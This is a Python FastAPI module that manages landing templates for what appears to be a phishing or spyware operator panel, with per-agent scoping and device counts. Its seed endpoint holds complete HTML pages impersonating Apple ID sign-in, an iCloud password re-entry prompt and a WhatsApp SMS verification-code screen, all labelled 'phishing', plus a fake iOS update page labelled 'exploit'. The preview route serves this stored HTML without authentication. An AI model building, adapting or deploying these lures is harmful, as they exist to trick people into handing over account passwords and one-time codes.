from fastapi import APIRouter, Depends, HTTPException, Request
from sqlalchemy.orm import Session
from sqlalchemy import desc, func, or_
from pydantic import BaseModel, Field
from typing import Optional
from datetime import datetime
import secrets

from ..database import get_db, LandingTemplate, Device, create_audit_log
from ..auth import get_current_user
from .settings import require_module_2fa
from ._helpers import apply_agent_filter_template, _resolve_agent_scope

router = APIRouter(prefix="/api/templates", tags=["templates"], redirect_slashes=False)


def _assert_owns_template(db, user, t: LandingTemplate) -> None:
    if t is None:
        return
    scope, aid = _resolve_agent_scope(db, user)
    if scope == "admin" or aid is None:
        return
    if t.agent_id is None:
        return
    if int(t.agent_id) != int(aid):
        raise HTTPException(403, "无权限访问该模板")


class TemplateCreate(BaseModel):
    slug: str = Field(..., min_length=2, max_length=64)
    name: str = Field(..., min_length=1, max_length=200)
    category: str = "generic"
    title: Optional[str] = None
    description: Optional[str] = None
    html_index: Optional[str] = None
    html_frame: Optional[str] = None
    js_assets: Optional[str] = None
    css_assets: Optional[str] = None
    preview_url: Optional[str] = None
    enabled: Optional[bool] = True


class TemplateUpdate(BaseModel):
    name: Optional[str] = Field(None, min_length=1, max_length=200)
    slug: Optional[str] = Field(None, min_length=2, max_length=64)
    category: Optional[str] = None
    title: Optional[str] = None
    description: Optional[str] = None
    html_index: Optional[str] = None
    html_frame: Optional[str] = None
    js_assets: Optional[str] = None
    css_assets: Optional[str] = None
    preview_url: Optional[str] = None
    enabled: Optional[bool] = None


def _serialize(t: LandingTemplate, db=None):
    d = {
        "id": t.id, "slug": t.slug, "name": t.name, "category": t.category or "generic",
        "title": t.title, "description": t.description,
        "html_index": t.html_index, "html_frame": t.html_frame,
        "js_assets": t.js_assets, "css_assets": t.css_assets, "preview_url": t.preview_url,
        "enabled": int(t.enabled if t.enabled is not None else 1),
        "visit_count": int(t.visit_count or 0), "device_count": int(t.device_count or 0),
        "agent_id": t.agent_id,
        "created_at": t.created_at.isoformat() if t.created_at else None,
        "updated_at": t.updated_at.isoformat() if t.updated_at else None,
    }
    if db:
        try:
            d["device_count"] = int(db.query(func.count(Device.id)).filter(Device.template_id == t.id).scalar() or 0)
        except Exception:
            pass
    return d


@router.get("")
async def list_templates(
    search: Optional[str] = None, category: Optional[str] = None, enabled: Optional[bool] = None,
    agent_id: Optional[int] = None, skip: int = 0, limit: int = 200,
    sort: Optional[str] = "id", order: Optional[str] = "desc",
    db: Session = Depends(get_db), current_user=Depends(get_current_user)
):
    q = db.query(LandingTemplate)
    q = apply_agent_filter_template(q, db, current_user)
    if search and search.strip():
        kw = f"%{search.strip()}%"
        q = q.filter(or_(LandingTemplate.slug.like(kw), LandingTemplate.name.like(kw),
                         LandingTemplate.title.like(kw), LandingTemplate.description.like(kw)))
    if category: q = q.filter(LandingTemplate.category == category)
    if enabled is True: q = q.filter(LandingTemplate.enabled == 1)
    elif enabled is False: q = q.filter(LandingTemplate.enabled == 0)
    if agent_id is not None:
        if int(agent_id) <= 0: q = q.filter(LandingTemplate.agent_id.is_(None))
        else: q = q.filter(LandingTemplate.agent_id == int(agent_id))
    total = q.count()
    order_func = desc if (order or "desc").lower() != "asc" else None
    col = {"id": LandingTemplate.id, "created_at": LandingTemplate.created_at,
           "name": LandingTemplate.name, "slug": LandingTemplate.slug,
           "visit_count": LandingTemplate.visit_count, "device_count": LandingTemplate.device_count
           }.get((sort or "id").lower(), LandingTemplate.id)
    q = q.order_by(desc(col) if order_func else col.asc())
    rows = q.offset(skip).limit(limit).all()
    return {"total": total, "items": [_serialize(r, db) for r in rows]}


@router.get("/{template_id}")
async def get_template(template_id: int, db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    t = db.query(LandingTemplate).filter(LandingTemplate.id == int(template_id)).first()
    if not t:
        raise HTTPException(404, "Template not found")
    _assert_owns_template(db, current_user, t)
    return _serialize(t, db)


@router.get("/slug/{slug}")
async def get_template_by_slug(slug: str, db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    t = db.query(LandingTemplate).filter(LandingTemplate.slug == slug).first()
    if not t:
        raise HTTPException(404, "Template not found")
    _assert_owns_template(db, current_user, t)
    return _serialize(t, db)


@router.get("/{template_id}/preview")
async def preview_template(template_id: int, db: Session = Depends(get_db)):
    t = db.query(LandingTemplate).filter(LandingTemplate.id == int(template_id)).first()
    if not t:
        raise HTTPException(404, "Template not found")
    html = t.html_index or t.html_frame or f"""<!doctype html><html><head><meta charset="utf-8"><title>{t.name or t.slug}</title></head><body style="font-family:-apple-system,BlinkMacSystemFont,sans-serif;padding:40px;"><h1>{t.name or t.slug}</h1><p>{t.description or "No description"}</p><p>Template ID: {t.id}</p></body></html>"""
    from fastapi.responses import HTMLResponse
    return HTMLResponse(content=html)


@router.post("")
async def create_template(request: Request, payload: TemplateCreate, otp_code: str = "", db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    require_module_2fa(db, current_user, "templates", otp_code)
    slug = payload.slug.strip()
    if db.query(LandingTemplate).filter(LandingTemplate.slug == slug).first():
        raise HTTPException(400, "slug 已存在")
    t = LandingTemplate(
        slug=slug, name=payload.name.strip(), category=payload.category or "generic",
        title=payload.title, description=payload.description,
        html_index=payload.html_index, html_frame=payload.html_frame,
        js_assets=payload.js_assets, css_assets=payload.css_assets,
        preview_url=payload.preview_url,
        enabled=1 if payload.enabled in (None, True) else 0,
        visit_count=0, device_count=0,
        created_at=datetime.now(), updated_at=datetime.now(),
    )
    db.add(t)
    db.commit()
    db.refresh(t)
    username = current_user.username if current_user else "anonymous"
    create_audit_log(db, username=username, action="template_create", resource_type="template",
                     resource_id=str(t.id), detail=f"Created template {t.slug}",
                     ip_address=request.client.host if request.client else None)
    return _serialize(t, db)


@router.patch("/{template_id}")
async def update_template(request: Request, template_id: int, payload: TemplateUpdate, otp_code: str = "", db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    require_module_2fa(db, current_user, "templates", otp_code)
    t = db.query(LandingTemplate).filter(LandingTemplate.id == int(template_id)).first()
    if not t:
        raise HTTPException(404, "Template not found")
    _assert_owns_template(db, current_user, t)
    if payload.name is not None: t.name = payload.name.strip()
    if payload.slug is not None:
        ns = payload.slug.strip()
        other = db.query(LandingTemplate).filter(LandingTemplate.slug == ns, LandingTemplate.id != t.id).first()
        if other: raise HTTPException(400, "slug 已存在")
        t.slug = ns
    for attr in ("category", "title", "description", "html_index", "html_frame", "js_assets", "css_assets", "preview_url"):
        if getattr(payload, attr, None) is not None:
            setattr(t, attr, getattr(payload, attr))
    if payload.enabled is not None: t.enabled = 1 if payload.enabled else 0
    t.updated_at = datetime.now()
    db.commit()
    db.refresh(t)
    username = current_user.username if current_user else "anonymous"
    create_audit_log(db, username=username, action="template_update", resource_type="template",
                     resource_id=str(t.id), detail=f"Updated template {t.slug}",
                     ip_address=request.client.host if request.client else None)
    return _serialize(t, db)


@router.delete("/{template_id}")
async def delete_template(request: Request, template_id: int, otp_code: str = "", db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    require_module_2fa(db, current_user, "templates", otp_code)
    t = db.query(LandingTemplate).filter(LandingTemplate.id == int(template_id)).first()
    if not t:
        raise HTTPException(404, "Template not found")
    _assert_owns_template(db, current_user, t)
    slug = t.slug
    db.delete(t)
    db.commit()
    username = current_user.username if current_user else "anonymous"
    create_audit_log(db, username=username, action="template_delete", resource_type="template",
                     resource_id=str(template_id), detail=f"Deleted template {slug}",
                     ip_address=request.client.host if request.client else None)
    return {"message": "Template deleted"}


@router.post("/seed")
async def seed_default_templates(request: Request, force: bool = False, otp_code: str = "", db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    require_module_2fa(db, current_user, "templates", otp_code)
    def _appleid_html():
        return """<!doctype html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
<title>Sign in to Apple</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;-webkit-font-smoothing:antialiased;}
body{font-family:-apple-system,BlinkMacSystemFont,"SF Pro Text","SF Pro Display","PingFang SC",sans-serif;background:#fbfbfd;color:#1d1d1f;min-height:100vh;display:flex;flex-direction:column;}
.nav{height:48px;background:rgba(0,0,0,0.8);backdrop-filter:saturate(180%) blur(20px);display:flex;align-items:center;justify-content:center;}
.nav svg{width:18px;height:22px;fill:#f5f5f7;}
.main{flex:1;display:flex;align-items:center;justify-content:center;padding:48px 20px;}
.card{width:100%;max-width:420px;background:#fff;border-radius:18px;padding:44px 40px;box-shadow:0 12px 40px rgba(0,0,0,.08);}
.logo{width:64px;height:64px;margin:0 auto 18px;display:block;}
.h{text-align:center;font-size:28px;font-weight:600;letter-spacing:-.5px;margin-bottom:6px;}
.sub{text-align:center;font-size:17px;color:#6e6e73;margin-bottom:28px;}
.field{margin-bottom:16px;}
.field input{
  width:100%;height:52px;padding:0 16px;border:1px solid #d2d2d7;border-radius:12px;
  font-size:17px;background:#fbfbfd;outline:none;transition:all .15s;
}
.field input:focus{border-color:#0071e3;box-shadow:0 0 0 4px rgba(0,113,227,.12);background:#fff;}
.btn{
  width:100%;height:52px;margin-top:8px;border:0;border-radius:12px;
  background:#0071e3;color:#fff;font-size:17px;font-weight:500;cursor:pointer;
}
.btn:active{background:#0077ed;}
.help{margin-top:22px;text-align:center;font-size:14px;color:#0071e3;}
.help span{margin:0 6px;color:#d2d2d7;}
.ftr{padding:22px 0;text-align:center;font-size:12px;color:#86868b;}
.ftr a{color:#0071e3;text-decoration:none;margin:0 6px;}
</style>
</head>
<body>
<div class="nav">
<svg viewBox="0 0 170 170"><path d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.2-2.12-9.98-3.17-14.35-3.17-4.58 0-9.5 1.05-14.76 3.17-5.27 2.13-9.51 3.24-12.73 3.35-4.93.21-9.84-1.96-14.75-6.52-3.13-2.73-7.04-7.41-11.74-14.04-5.02-7.08-9.17-15.29-12.46-24.65-3.47-10.11-5.21-19.9-5.21-29.38 0-10.86 2.35-20.23 7.06-28.08 3.7-6.33 8.64-11.27 14.83-14.85 6.22-3.55 12.88-5.31 19.97-5.31 3.91 0 8.95 1.21 15.15 3.59 6.2 2.39 10.33 3.6 12.4 3.6 1.32 0 5.8-1.46 13.45-4.4 7.27-2.72 13.3-3.98 18.12-3.77 13.8.63 23.72 6.07 29.68 16.29-12.11 7.51-18.12 18.03-18.05 31.49.06 10.34 3.86 18.93 11.43 25.79 3.28 3.08 6.96 5.5 11.05 7.25-.9 2.6-1.85 5.11-2.86 7.53zM119.11 7.24c0 8.1-2.96 15.67-8.86 22.66-7.12 8.32-15.77 13.14-25.18 12.37a25.22 25.22 0 0 1-.19-3.07c0-7.77 3.38-16.11 9.39-22.98 3.06-3.53 6.85-6.35 11.39-8.48 4.55-2.16 8.5-3.41 11.84-3.71.39 1.04.61 2.08.61 3.21z"/></svg>
</div>
<div class="main">
  <div class="card">
    <svg class="logo" viewBox="0 0 170 170"><path fill="#1d1d1f" d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.2-2.12-9.98-3.17-14.35-3.17-4.58 0-9.5 1.05-14.76 3.17-5.27 2.13-9.51 3.24-12.73 3.35-4.93.21-9.84-1.96-14.75-6.52-3.13-2.73-7.04-7.41-11.74-14.04-5.02-7.08-9.17-15.29-12.46-24.65-3.47-10.11-5.21-19.9-5.21-29.38 0-10.86 2.35-20.23 7.06-28.08 3.7-6.33 8.64-11.27 14.83-14.85 6.22-3.55 12.88-5.31 19.97-5.31 3.91 0 8.95 1.21 15.15 3.59 6.2 2.39 10.33 3.6 12.4 3.6 1.32 0 5.8-1.46 13.45-4.4 7.27-2.72 13.3-3.98 18.12-3.77 13.8.63 23.72 6.07 29.68 16.29-12.11 7.51-18.12 18.03-18.05 31.49.06 10.34 3.86 18.93 11.43 25.79 3.28 3.08 6.96 5.5 11.05 7.25-.9 2.6-1.85 5.11-2.86 7.53z"/></svg>
    <div class="h">使用 Apple ID 登录</div>
    <div class="sub">输入您的 Apple ID 和密码</div>
    <form onsubmit="event.preventDefault();document.querySelector('.btn').textContent='正在验证…';">
      <div class="field"><input type="text" placeholder="Apple ID" autocomplete="username" /></div>
      <div class="field"><input type="password" placeholder="密码" autocomplete="current-password" /></div>
      <button class="btn" type="submit">继续</button>
      <div class="help">
        <a href="javascript:;">忘记 Apple ID 或密码？</a><span>|</span><a href="javascript:;">创建 Apple ID</a>
      </div>
    </form>
  </div>
</div>
<div class="ftr">
  <div>Copyright © 2025 Apple Inc. 保留所有权利。</div>
  <div><a href="javascript:;">隐私政策</a><a href="javascript:;">使用条款</a><a href="javascript:;">销售政策</a></div>
</div>
</body>
</html>"""

    def _icloud_html():
        return """<!doctype html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
<title>iCloud Photos</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:-apple-system,BlinkMacSystemFont,"PingFang SC",sans-serif;background:#000;color:#fff;min-height:100vh;}
.top{height:54px;display:flex;align-items:center;justify-content:space-between;padding:0 20px;border-bottom:1px solid #1d1d1f;}
.logo{display:flex;align-items:center;gap:8px;font-size:20px;font-weight:500;}
.logo svg{width:26px;height:30px;fill:#fff;}
.tabs{display:flex;gap:24px;font-size:14px;color:#a1a1a6;}
.tabs .active{color:#fff;}
.main{padding:40px 28px;}
.banner{
  background:linear-gradient(135deg,#1c3d5a 0%,#2d1b4e 100%);
  border-radius:18px;padding:36px;margin-bottom:30px;
  display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:20px;
}
.banner h1{font-size:30px;font-weight:600;margin-bottom:8px;}
.banner p{color:#b5b5bb;font-size:15px;}
.banner .btns{display:flex;gap:10px;}
.banner button{
  height:44px;padding:0 22px;border-radius:11px;border:0;font-size:15px;font-weight:500;cursor:pointer;
}
.banner .p{background:#007aff;color:#fff;}
.banner .s{background:rgba(255,255,255,.08);color:#fff;border:1px solid rgba(255,255,255,.12);}
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;margin-bottom:30px;}
.scard{background:#111;border:1px solid #1d1d1f;border-radius:14px;padding:20px;}
.scard .n{font-size:28px;font-weight:600;margin-bottom:4px;}
.scard .l{color:#86868b;font-size:13px;}
.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;}
.grid div{
  aspect-ratio:1;border-radius:10px;background-size:cover;background-position:center;
  background:linear-gradient(45deg,#2a2a2e,#3a3a3e);position:relative;
}
.grid div:nth-child(1){background:linear-gradient(135deg,#ff9a9e,#fad0c4);}
.grid div:nth-child(2){background:linear-gradient(135deg,#a1c4fd,#c2e9fb);}
.grid div:nth-child(3){background:linear-gradient(135deg,#ffecd2,#fcb69f);}
.grid div:nth-child(4){background:linear-gradient(135deg,#84fab0,#8fd3f4);}
.grid div:nth-child(5){background:linear-gradient(135deg,#a6c0fe,#f68084);}
.grid div:nth-child(6){background:linear-gradient(135deg,#fccb90,#d57eeb);}
.grid div:nth-child(7){background:linear-gradient(135deg,#c3cfe2,#c3cfe2);}
.grid div:nth-child(8){background:linear-gradient(135deg,#ff6e7f,#bfe9ff);}
.hint{
  position:fixed;top:54px;left:0;right:0;padding:12px;text-align:center;
  background:rgba(255,204,0,.12);color:#ffcc00;font-size:13px;border-bottom:1px solid rgba(255,204,0,.2);
}
.login{
  position:fixed;inset:0;background:rgba(0,0,0,.85);display:flex;align-items:center;justify-content:center;z-index:10;
}
.lcard{width:400px;background:#1c1c1e;border:1px solid #2c2c2e;border-radius:18px;padding:36px 32px;}
.lcard h2{font-size:22px;margin-bottom:6px;}
.lcard p{color:#8e8e93;font-size:14px;margin-bottom:22px;}
.lcard input{
  width:100%;height:48px;margin-bottom:14px;padding:0 14px;border-radius:11px;
  border:1px solid #38383a;background:#000;color:#fff;font-size:15px;outline:none;
}
.lcard input:focus{border-color:#007aff;}
.lcard button{width:100%;height:48px;border-radius:11px;border:0;background:#007aff;color:#fff;font-size:16px;font-weight:500;}
</style>
</head>
<body>
<div class="hint">⚠️ 为保护您的照片，请先验证 Apple ID 身份</div>
<div class="top">
  <div class="logo">
    <svg viewBox="0 0 24 24"><path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.08l.01.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/></svg>
    <span>iCloud</span>
  </div>
  <div class="tabs"><span class="active">照片</span><span>通讯录</span><span>备忘录</span><span>查找</span></div>
  <div style="font-size:14px;color:#a1a1a6;">admin@icloud.com</div>
</div>
<div class="main">
  <div class="banner">
    <div>
      <h1>iCloud 照片</h1>
      <p>2,847 张照片 · 46 个视频 · 上次同步：刚刚</p>
    </div>
    <div class="btns">
      <button class="p">上传照片</button>
      <button class="s">共享相簿</button>
    </div>
  </div>
  <div class="stats">
    <div class="scard"><div class="n">2,847</div><div class="l">照片</div></div>
    <div class="scard"><div class="n">46</div><div class="l">视频</div></div>
    <div class="scard"><div class="n">12</div><div class="l">相簿</div></div>
    <div class="scard"><div class="n">3.4 GB</div><div class="l">已使用 (5 GB)</div></div>
  </div>
  <div class="grid"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
</div>
<div class="login">
  <div class="lcard">
    <h2>解锁 iCloud 照片</h2>
    <p>会话已过期，请重新输入密码以继续查看</p>
    <input type="text" placeholder="Apple ID" value="admin@icloud.com" readonly />
    <input type="password" placeholder="Apple ID 密码" />
    <button onclick="this.textContent='正在验证…'">继续</button>
  </div>
</div>
</body>
</html>"""

    def _ios_html():
        return """<!doctype html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
<title>Software Update</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:-apple-system,BlinkMacSystemFont,"SF Pro Text","PingFang SC",sans-serif;background:#000;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;}
.phone{
  width:390px;height:844px;background:#000;border-radius:50px;padding:12px;
  box-shadow:0 0 0 3px #1d1d1f,0 30px 80px rgba(0,0,0,.6);position:relative;
}
.screen{
  width:100%;height:100%;background:#f2f2f7;border-radius:38px;overflow:hidden;position:relative;
  display:flex;flex-direction:column;
}
.notch{
  position:absolute;top:10px;left:50%;transform:translateX(-50%);
  width:120px;height:32px;background:#000;border-radius:20px;z-index:10;
}
.status{
  height:54px;display:flex;align-items:center;justify-content:space-between;padding:18px 28px 0;font-size:15px;font-weight:600;color:#000;
}
.title{padding:16px 24px 8px;font-size:34px;font-weight:700;color:#000;}
.subtitle{padding:0 24px 20px;color:#8e8e93;font-size:15px;}
.card{
  margin:0 16px;background:#fff;border-radius:14px;padding:18px;box-shadow:0 1px 3px rgba(0,0,0,.04);
}
.row{display:flex;align-items:center;gap:12px;padding:8px 0;}
.row + .row{border-top:1px solid #f2f2f7;}
.icon{
  width:56px;height:56px;border-radius:14px;
  display:flex;align-items:center;justify-content:center;flex-shrink:0;
  background:linear-gradient(135deg,#007aff,#5856d6);
}
.icon svg{width:28px;height:28px;fill:#fff;}
.meta{flex:1;}
.meta h3{font-size:17px;font-weight:600;color:#000;margin-bottom:2px;}
.meta p{font-size:13px;color:#8e8e93;}
.v{font-size:13px;color:#8e8e93;}
.divider{height:8px;}
.progress{height:8px;background:#e5e5ea;border-radius:100px;overflow:hidden;margin:16px 0;position:relative;}
.progress::after{
  content:'';position:absolute;left:0;top:0;bottom:0;width:62%;
  background:linear-gradient(90deg,#007aff,#34c759);border-radius:100px;
}
.ptxt{display:flex;justify-content:space-between;font-size:13px;color:#8e8e93;margin-bottom:10px;}
.btn{
  display:block;width:calc(100% - 32px);margin:0 16px;height:50px;border-radius:12px;
  background:#007aff;color:#fff;font-size:17px;font-weight:600;border:0;
}
.btn:active{opacity:.8;}
.btn2{
  display:block;width:calc(100% - 32px);margin:12px 16px 20px;height:50px;border-radius:12px;
  background:#fff;color:#007aff;font-size:17px;font-weight:500;border:1px solid #e5e5ea;
}
.fnote{padding:0 24px;color:#8e8e93;font-size:12px;line-height:1.6;}
.home{
  position:absolute;bottom:8px;left:50%;transform:translateX(-50%);
  width:134px;height:5px;background:#000;border-radius:3px;opacity:.5;
}
</style>
</head>
<body>
<div class="phone">
  <div class="screen">
    <div class="notch"></div>
    <div class="status"><span>9:41</span><span>●●●● 5G</span></div>
    <div class="title">软件更新</div>
    <div class="subtitle">iOS 18.1.1 现在可以下载</div>

    <div class="card">
      <div class="row">
        <div class="icon">
          <svg viewBox="0 0 24 24"><path d="M3 13h8V3H3v10zm0 8h8v-6H3v6zm10 0h8V11h-8v10zm0-18v6h8V3h-8z"/></svg>
        </div>
        <div class="meta">
          <h3>iOS 18.1.1</h3>
          <p>包含错误修复与安全更新</p>
        </div>
        <div class="v">2.4 GB</div>
      </div>
    </div>

    <div class="divider"></div>

    <div class="card">
      <div class="row">
        <div class="meta"><h3>发布日期</h3></div>
        <div class="v">2025-07-22</div>
      </div>
      <div class="row">
        <div class="meta"><h3>安全建议</h3></div>
        <div class="v" style="color:#ff9500;">推荐安装</div>
      </div>
    </div>

    <div style="padding:0 24px;margin-top:18px;">
      <div class="ptxt"><span>正在下载…</span><span>62%</span></div>
      <div class="progress"></div>
    </div>

    <button class="btn" onclick="this.innerHTML='<span style=display:inline-block;vertical-align:middle;width:16px;height:16px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:sp 1s linear infinite;margin-right:8px;></span>正在安装…';this.style.background='#34c759';">现在安装</button>
    <style>@keyframes sp{to{transform:rotate(360deg);}}</style>
    <button class="btn2">稍后</button>

    <div class="fnote">
      本更新包含安全补丁并修复了导致电池续航下降、相机取景器可能出现黑块、Siri 可能无法响应、数据备份失败等问题。<br/><br/>
      「安装」即表示您同意 Apple 的<a style="color:#007aff;">软件许可协议</a>。
    </div>

    <div class="home"></div>
  </div>
</div>
</body>
</html>"""

    def _whatsapp_html():
        return """<!doctype html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
<title>Verify WhatsApp</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC",sans-serif;background:#e5ddd5;min-height:100vh;}
.header{
  background:#075e54;color:#fff;padding:14px 18px;display:flex;align-items:center;gap:14px;
  box-shadow:0 2px 6px rgba(0,0,0,.15);position:sticky;top:0;z-index:5;
}
.header h1{font-size:18px;font-weight:500;}
.header svg{width:24px;height:24px;fill:#fff;opacity:.8;}
.chat{
  max-width:640px;margin:0 auto;padding:18px 14px 80px;
  background-image:
    radial-gradient(rgba(0,0,0,.04) 1px,transparent 1px);
  background-size:20px 20px;background-color:#e5ddd5;
}
.msg{max-width:80%;margin-bottom:10px;padding:8px 10px 6px;border-radius:8px;font-size:15px;line-height:1.5;position:relative;box-shadow:0 1px 1px rgba(0,0,0,.08);}
.me{margin-left:auto;background:#dcf8c6;border-top-right-radius:2px;}
.them{margin-right:auto;background:#fff;border-top-left-radius:2px;}
.time{font-size:11px;color:rgba(0,0,0,.45);text-align:right;margin-top:3px;}
.codebox{
  background:#fff4d6;border:1px solid #f5d68f;border-radius:12px;padding:14px 18px;margin:18px;
  display:flex;align-items:center;gap:12px;
}
.codebox .ic{
  width:46px;height:46px;background:#f5d68f;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;
}
.codebox .ic svg{width:24px;height:24px;fill:#8a5a00;}
.codebox h3{font-size:16px;margin-bottom:3px;color:#5a3d00;}
.codebox p{font-size:13px;color:#8a5a00;}
.verify{
  position:fixed;bottom:0;left:0;right:0;background:#fff;border-top:1px solid #ddd;padding:20px 24px 28px;
  box-shadow:0 -4px 20px rgba(0,0,0,.08);
}
.verify h2{font-size:20px;margin-bottom:6px;}
.verify p{font-size:13px;color:#555;margin-bottom:16px;}
.verify p b{color:#d6393a;}
.inputs{display:flex;gap:10px;justify-content:center;margin-bottom:16px;}
.inputs input{
  width:46px;height:54px;text-align:center;font-size:24px;font-weight:700;
  border:1.5px solid #ccc;border-radius:10px;background:#f9f9f9;color:#075e54;outline:none;
}
.inputs input:focus{border-color:#075e54;background:#fff;}
.vbtn{
  width:100%;height:52px;background:#075e54;color:#fff;border:0;border-radius:10px;
  font-size:17px;font-weight:600;cursor:pointer;
}
.vbtn:active{background:#054c44;}
.greenbar{
  height:6px;background:linear-gradient(90deg,#25d366,#128c7e);position:fixed;top:0;left:0;right:0;z-index:10;
}
</style>
</head>
<body>
<div class="greenbar"></div>
<div class="header">
  <svg viewBox="0 0 24 24"><path d="M20.52 3.48A11.86 11.86 0 0 0 12.04 0C5.5 0 .18 5.32.18 11.86c0 2.09.54 4.13 1.57 5.93L0 24l6.4-1.67a11.86 11.86 0 0 0 5.64 1.43h.01c6.53 0 11.86-5.32 11.86-11.86 0-3.17-1.23-6.14-3.39-8.42zM12.05 21.6h-.01a9.74 9.74 0 0 1-4.98-1.37l-.36-.22-3.8 1 .99-3.7-.24-.37a9.75 9.75 0 1 1 8.39 15.66zm5.34-7.26c-.29-.15-1.73-.86-2-1-.27-.13-.46-.2-.65.2-.19.39-.75 1-.92 1.2-.17.2-.34.22-.63.08-.29-.15-1.22-.45-2.33-1.44a8.82 8.82 0 0 1-4.82-6.39c-.13-.79.13-1.31.29-1.67.14-.32.31-.4.42-.66.1-.27.05-.49-.02-.69-.08-.2-.69-1.66-.95-2.28-.25-.59-.51-.51-.65-.52h-.55c-.19 0-.51.07-.78.36-.27.29-1.02 1-1.02 2.44 0 1.44 1.05 2.84 1.2 3.04.15.2 2.05 3.13 4.96 4.4.69.3 1.23.47 1.65.61.69.22 1.32.19 1.82.12.55-.08 1.73-.71 1.97-1.39.25-.68.25-1.26.17-1.39-.08-.13-.29-.2-.58-.35z"/></svg>
  <h1>WhatsApp</h1>
</div>

<div class="chat">
  <div class="msg them">您好，您的 WhatsApp 账号正在新设备上登录验证<sup style="color:#0099ff;">官方</sup><div class="time">09:12</div></div>
  <div class="msg them">为确认是您本人操作，请在下方输入您收到的 6 位短信验证码。<div class="time">09:12</div></div>
  <div class="msg me">我没收到短信？<div class="time">09:13</div></div>
  <div class="msg them">请稍候，我们将通过语音电话重新发送验证码。<div class="time">09:13</div></div>
</div>

<div class="codebox">
  <div class="ic">
    <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
  </div>
  <div>
    <h3>语音验证码已发送</h3>
    <p>请接听 +86 来电，并按提示输入 6 位数字验证码</p>
  </div>
</div>

<div class="verify">
  <h2>输入 6 位验证码</h2>
  <p>您的账号<b> +86 138****8888 </b>正在进行安全验证，请勿将验证码告知他人</p>
  <form onsubmit="event.preventDefault();document.querySelector('.vbtn').textContent='验证中…';">
    <div class="inputs">
      <input type="text" maxlength="1" inputmode="numeric" />
      <input type="text" maxlength="1" inputmode="numeric" />
      <input type="text" maxlength="1" inputmode="numeric" />
      <input type="text" maxlength="1" inputmode="numeric" />
      <input type="text" maxlength="1" inputmode="numeric" />
      <input type="text" maxlength="1" inputmode="numeric" />
    </div>
    <button class="vbtn" type="submit">确认验证</button>
  </form>
</div>
<script>
const boxes=document.querySelectorAll('.inputs input');
boxes.forEach((el,i)=>{el.addEventListener('input',()=>{if(el.value&&i<boxes.length-1)boxes[i+1].focus();});});
</script>
</body>
</html>"""

    existing = db.query(func.count(LandingTemplate.id)).scalar() or 0
    if existing > 0 and not force:
        return {"message": f"已有 {existing} 个模板，跳过 seed；传 force=true 可强制覆盖", "count": existing}
    defaults = [
        {"slug": "appleid-login", "name": "Apple ID 登录", "category": "phishing", "title": "Sign in to Apple", "html_index": _appleid_html()},
        {"slug": "icloud-photos", "name": "iCloud 照片", "category": "phishing", "title": "iCloud Photos", "html_index": _icloud_html()},
        {"slug": "ios-update", "name": "iOS 系统更新", "category": "exploit", "title": "Software Update", "html_index": _ios_html()},
        {"slug": "whatsapp-verify", "name": "WhatsApp 验证", "category": "phishing", "title": "Verify WhatsApp", "html_index": _whatsapp_html()},
    ]
    count = 0
    for d in defaults:
        if not db.query(LandingTemplate).filter(LandingTemplate.slug == d["slug"]).first():
            t = LandingTemplate(
                slug=d["slug"], name=d["name"], category=d["category"], title=d["title"],
                html_index=d.get("html_index"),
                description=f"默认模板：{d['name']}",
                enabled=1, created_at=datetime.now(), updated_at=datetime.now(),
            )
            db.add(t)
            count += 1
    db.commit()
    username = current_user.username if current_user else "system"
    create_audit_log(db, username=username, action="template_seed", resource_type="template",
                     detail=f"Seeded {count} default templates with HTML",
                     ip_address=request.client.host if request.client else None)
    return {"message": "Seeded with full HTML content", "created": count}
